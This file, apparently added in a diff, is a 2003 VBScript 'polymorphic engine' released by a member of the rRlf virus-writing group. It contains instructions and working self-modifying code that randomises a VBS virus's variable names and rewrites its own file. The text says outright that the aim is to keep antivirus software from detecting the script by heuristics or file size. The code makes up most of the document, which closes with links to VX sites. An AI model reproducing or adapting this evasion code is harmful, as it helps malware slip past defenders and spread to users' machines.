@@ -1,0 +1,73 @@
+          Kefi's VBS Polymorphic Engine v0.1
+                       [KVPE]
+                  January 24, 2003
+                     Kefi.[rRlf]
+ -
+
+How to use KVPE:
+ 1. Make a list of every variable in your VBS file
+ 2. Add it them at the line given
+ 3. Add the following code to the bottom of your VBS file
+
+ -
+
+Significance:
+  This script will replace your variables with a randomly created string with
+ a random length. By doing this Anti-Viruses will not be able to pick them
+ up with heuristic scanning, or by the file's size.
+
+ -
+
+Disclaimer:
+  This code is for educational purposes only. I will not be held responsible
+ for your actions with this script.
+  If you are to use this script in your VBS file you MUST contact me first. I
+ do not want this method spread.
+
+ -
+
+Note:
+  On run this file will create new varibles in your file, which will be hard
+ to work with, I sujest not running the file until it is finished.
+
+ -
+
+Contact Me:
+e-Mail       -    kefi@rRlf.de
+HTTP         -    http://vx.netlux.org/~kefi
+VX Group     -    http://rRlf.de
+
+'---------------- KVPE Code Starts ----------------
+randomize
+set fso=createobject("scripting.filesystemobject")
+set vbsfile=fso.opentextfile(wscript.scriptfullname,1,false)
+code=vbsfile.readall
+vars=array("code","vars","var","newlet","num","newlet","fso","vbsfile") '<--- Add all of your varibles here, but do not take any of the ones already in out because if you do the script will not work.
+for each var in vars
+ for num=1 to int(rnd*14) + 2
+ if int(rnd*2)+1=1 then
+  newlet=newlet& ucase(chr((int(rnd*22)+97)))
+  if int(rnd*2)+1=1 then
+   newlet=newlet & int(rnd*int(rnd*4))
+  end if
+ else
+  newlet=newlet&lcase(chr((int(rnd*22)+97)))
+  if int(rnd*2)+1=1 then
+   newlet=newlet&int(rnd *2)
+  else
+   newlet=newlet&int(rnd*int(rnd*6))
+  end if
+ end if
+ next
+ code=replace(code,var,newlet)
+ newlet=""
+next
+set vbsfile=fso.opentextfile(wscript.scriptfullname,2,false)
+vbsfile.write code
+'---------------- KVPE Code Stops ----------------
+
+A newer version may be expected in the future, goto http://vx.netlux.org/~kefi for
+updates.
+
+Regards,
+Kefi.[rRlf]
